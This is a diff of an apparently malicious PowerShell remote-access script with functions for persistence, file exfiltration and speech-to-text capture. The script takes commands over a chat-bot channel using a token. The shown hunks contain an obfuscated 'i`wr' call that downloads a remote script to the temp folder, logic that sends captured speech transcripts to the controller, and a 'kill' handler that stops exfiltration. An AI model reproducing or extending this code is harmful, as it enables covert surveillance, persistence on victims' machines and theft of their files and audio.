@@ -710,7 +710,6 @@ Function AddPersistance{
     $scriptContent | Out-File -FilePath $newScriptPath -force
     sleep 1
     if ($newScriptPath.Length -lt 100){
-        "`$dc = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
         "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
         "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
         i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
@@ -775,7 +774,7 @@ Function Exfiltrate {
                 PullMsg
                 if ($response -like "kill") {
                     sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
-                    $previouscmd = $response
+                    $script:previouscmd = $response
                     break
                 }
             }
@@ -818,8 +817,9 @@ Function SpeechToText {
             Write-Output $results
             sendMsg -Message "``````$results``````"
         }
-        $messages = PullMsg
-        if ($messages -match "kill") {
+        PullMsg
+        if ($response -like "kill") {
+	$script:previouscmd = $response
         break
         }
     }
